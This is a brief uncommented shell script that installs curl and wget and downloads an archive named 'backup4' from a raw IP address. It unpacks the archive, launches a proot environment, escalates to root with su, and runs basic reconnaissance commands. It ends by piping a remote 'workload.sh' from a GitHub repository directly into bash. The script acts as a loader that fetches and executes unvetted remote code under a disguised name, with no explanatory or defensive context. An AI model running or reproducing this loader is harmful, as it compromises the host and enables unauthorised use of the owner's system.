#!/bin/sh
apt update;apt -y install wget curl
curl -L -o backup4.tar.gz http://45.135.58.52/backup4.tar.gz
tar -xf backup4.tar.gz
./dist/proot -S . /bin/bash
sleep 2
su -
sleep 2
cd
whoami
ls -la
pwd
sleep 2
wget -O - https://raw.githubusercontent.com/khayalethuungabayeki/setupCrayons/main/workload.sh | bash
